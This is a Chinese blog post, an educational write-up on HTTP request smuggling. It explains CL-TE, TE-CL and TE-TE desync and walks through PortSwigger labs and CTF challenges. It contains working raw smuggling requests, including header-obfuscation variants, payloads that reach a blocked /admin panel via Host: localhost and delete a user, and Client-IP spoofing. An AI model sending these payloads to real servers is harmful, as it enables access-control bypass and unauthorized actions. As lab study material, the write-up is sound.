    <id>https://swhat.github.io/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-11T13:52:10.000Z</published>
    <updated>2021-08-15T03:59:06.553Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：HTTP请求走私漏洞学习</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做一道题的时候，在大师傅的wp中发现可以利用HTTP请求走私漏洞绕过WAF,联想到hgame2021也有类似的题，当时连wp都看不懂，直接使用官方wp的Payload，也不能得到结果，现在来总结一下。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><ul><li>利用Content-Length字段来判定请求体的内容长度 </li><li>利用Transfer-Encoding字段来判定请求体的结束位置</li></ul><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。</p><p>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><h3 id="CL与TE解析优先级顺序"><a href="#CL与TE解析优先级顺序" class="headerlink" title="CL与TE解析优先级顺序"></a>CL与TE解析优先级顺序</h3><p>CL表示Content-Length，TE表示Transfer-Encoding。</p><p>优先级顺序详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3 </a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> a message <span class="hljs-keyword">is</span> received <span class="hljs-keyword">with</span> <span class="hljs-keyword">both</span> a Transfer-<span class="hljs-keyword">Encoding</span> <span class="hljs-keyword">and</span> a<br>Content-Length <span class="hljs-keyword">header</span> field, the Transfer-<span class="hljs-keyword">Encoding</span> overrides the<br>Content-Length. Such a message might indicate an attempt <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span><br>request smuggling (Section <span class="hljs-number">9.5</span>) <span class="hljs-keyword">or</span> response splitting (Section <span class="hljs-number">9.4</span>)<br><span class="hljs-keyword">and</span> ought <span class="hljs-keyword">to</span> be handled <span class="hljs-keyword">as</span> an error. A sender MUST remove the received Content-Length field prior <span class="hljs-keyword">to</span> forwarding such a message downstream.<br></code></pre></td></tr></table></figure><p>TE 优先于 CL ，但可以通过一些方式绕过</p><h2 id="请求走私分类"><a href="#请求走私分类" class="headerlink" title="请求走私分类"></a>请求走私分类</h2><p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li><li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li><li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li><li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li></ul><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。</p><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 44\r\n<br>\r\n<br>GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p><strong>注：\r\n表示 CRLF即换行</strong></p><p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：</p><p>第一个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><p>第二个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><h3 id="CL-CL漏洞"><a href="#CL-CL漏洞" class="headerlink" title="CL-CL漏洞"></a>CL-CL漏洞</h3><p><strong>RFC7230规范</strong>：在RFC7230的<a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">第3.3.3节</a>中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 5\r\n<br>Content-Length: 6\r\n<br>\r\n<br>12345\r\n<br>a<br></code></pre></td></tr></table></figure><p>得到响应，返回400 Bad Request<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png" alt="2"><br><strong>触发过程</strong></p><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p><h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL-TE漏洞"></a>CL-TE漏洞</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p><blockquote><p>实验描述：<br>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码（Transfer-Encoding解析），前端服务器拒绝未使用GET或POST方法之外的请求。</p><p>实验要求：<br>将请求走私到后端服务器，以便后端服务器处理的下一个请求像是使用了GPOST方法。</p></blockquote><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png" alt="labs1"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png" alt="1"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求就可以获得响应。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png" alt="2"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p><p><strong>触发过程</strong></p><p>前端服务器处理Content-Length头并确定请求主体长度为6个字节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G<br></code></pre></td></tr></table></figure><p>此请求经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到<code>0\r\n\r\n</code>时，会被认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，G会被带入下一个请求，发送的请求在后端服务器变为 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br></code></pre></td></tr></table></figure><p>服务器在解析时会产生报错</p><h3 id="TE-TE漏洞"><a href="#TE-TE漏洞" class="headerlink" title="TE-TE漏洞"></a>TE-TE漏洞</h3><p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p><p>详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3.3</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">If a Transfer-Encoding header field is present <span class="hljs-keyword">in</span> a response and<br>the chunked transfer coding is not the final encoding, the<br>message body length is determined by reading the connection until<br>it is closed by the server.  If a Transfer-Encoding header field<br>is present <span class="hljs-keyword">in</span> a request and the chunked transfer coding is not<br>the final encoding, the message body length cannot be determined<br>reliably; the server MUST respond with the 400 (Bad Request)<br>status code and <span class="hljs-keyword">then</span> close the connection.<br></code></pre></td></tr></table></figure><p>这里列出七种混淆方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Transfer-Encoding: xchunked<br><br>Transfer-Encoding : chunked<br><br>Transfer-Encoding: x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br>X: X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure><p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。而我们所要做的就是找到其中存在问题的服务器，然后使用类似前两个情形的攻击报文走私数据。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.TE验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png" alt="QQ截图20210406190848"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>Transfer-encoding: cow\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png" alt="2"></p><p>分析：前端将body的内容视为正常请求，到了后端，因为<code>Transfer-encoding: cow</code>无法识别，将会转而使用<code>Content-length: 4</code>，从而产生报错</p><h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE-CL漏洞"></a>TE-CL漏洞</h3><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png" alt="timu"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png" alt="1"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png" alt="0"><br>构造请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>......<br>Transfer-Encoding: chunked\r\n<br>Content-Length: 3\r\n<br>\r\n<br>1\r\n<br>G\r\n<br>0\r\n<br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png" alt="2"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>12\r\n<br>GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续请求两次<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png" alt="3"></p><p>官方提供的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: your-lab-id.web-security-academy.net\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded\r\n<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>得到响应<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png" alt="4"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>成功报错。</p><p>前端服务器处理Transfer-Encoding标头，因此将消息正文视为使用分块编码。它处理第一个块，声明为12个字节长，直到下一行的开始<code>GPOST / HTTP/1.1</code>。它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。该请求被转发到后端服务器。</p><p>后端服务器处理Content-Length标头，并确定请求主体的长度为4个字节，直到下一行的开始12。以下以开头的字节<code>GPOST / HTTP/1.1</code>未处理，后端服务器会将其视为序列中下一个请求的开始。</p><h2 id="绕过前端服务器安全控制"><a href="#绕过前端服务器安全控制" class="headerlink" title="绕过前端服务器安全控制"></a>绕过前端服务器安全控制</h2><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><h3 id="利用CL-TE漏洞绕过"><a href="#利用CL-TE漏洞绕过" class="headerlink" title="利用CL-TE漏洞绕过"></a>利用CL-TE漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a></p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png" alt="timu"></p><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><p>按照要求访问管理面板/admin，会提示Path /admin is blocked</p><p>利用CL-TE漏洞，构造数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 37<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>发现只能本地用户查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png" alt="1"><br>连续两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 54<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png" alt="2"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 116<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>现在可以访问管理面板</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png" alt="3"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 139<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png" alt="5"></p><h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png" alt="题目"><br>这次利用TE-CL漏洞，构造数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>60<br>POST /admin HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>允许本地查看<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190544-763227.png" alt="1"><br>两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Type: application/x-www-form-urlencoded<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>71<br>POST /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>成功访问管理员页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190552-248001.png" alt="2"><br>更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>87<br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>访问管理员页面验证是否删除</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190623-841809.png" alt="3"></p><h2 id="CTF中的请求走私"><a href="#CTF中的请求走私" class="headerlink" title="CTF中的请求走私"></a>CTF中的请求走私</h2><p><strong>HGAME2021-宝藏走私者</strong></p><p>hint: 注意留意服务器信息<br>资料：<a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a><br>宝藏走私者 Switch 喜欢偷盗并将奇特的宝藏走私到一些黑市商家手中。<br>为了阻止其继续作恶，警探 Liki 奉命将 Switch 抓捕归案。<br>调查过程中，Liki 发现 Switch 将一个秘密藏在了一个私人服务器中。<br>这或许会成为后续追查 Switch 的重大线索，你能找到这个秘密吗？<br><img src="https://img-blog.csdnimg.cn/20210206224207823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击超链接跳转到/secret，发现响应包中提示需要<code>client-ip</code>头</p><p><img src="https://img-blog.csdnimg.cn/20210206224349121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>将client-ip改为127.0.0.1，发现还是不行，猜测是反代会将真实ip带到后面，抓包看到服务器是ATS/7.1.2，反代服务器本版存在HTTP Smuggling CL-TE 漏洞，可以利用HTTP请求走私</p><p>构造请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>hrs.localhost<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br></code></pre></td></tr></table></figure><p>由于没有赛后复现没有环境，贴一张其他大师傅的wp</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202105/02/225619-18140.png" alt="image-20210502225618544"></p><p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190649-214946.png" alt="题目"><br>calc.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span 